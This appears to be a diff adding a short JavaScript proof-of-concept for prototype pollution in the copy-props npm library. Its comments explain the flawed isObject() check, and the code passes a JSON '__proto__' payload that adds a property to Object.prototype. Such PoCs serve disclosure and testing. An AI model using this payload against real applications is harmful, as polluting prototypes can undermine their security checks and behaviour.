@@ -1,0 +1,16 @@
+```javascript
+const copyProps = require("./node_modules/copy-props");
+
+// isObject() in copy-props (and each-props) only checks
+// Object.prototype.toString.call(v) === '[object Object]' and never
+// rejects dangerous keys like "__proto__". Because of that, the object
+// below is treated as a normal plain object and its "__proto__.polluted"
+// key chain is walked and assigned directly onto Object.prototype.
+const malicious = JSON.parse('{"__proto__": {"polluted": "yes"}}');
+const dst = {};
+
+copyProps(malicious, dst);
+
+// Prototype pollution: every plain object now has a "polluted" property.
+console.log("polluted:", ({}).polluted); // -> "yes"
+```
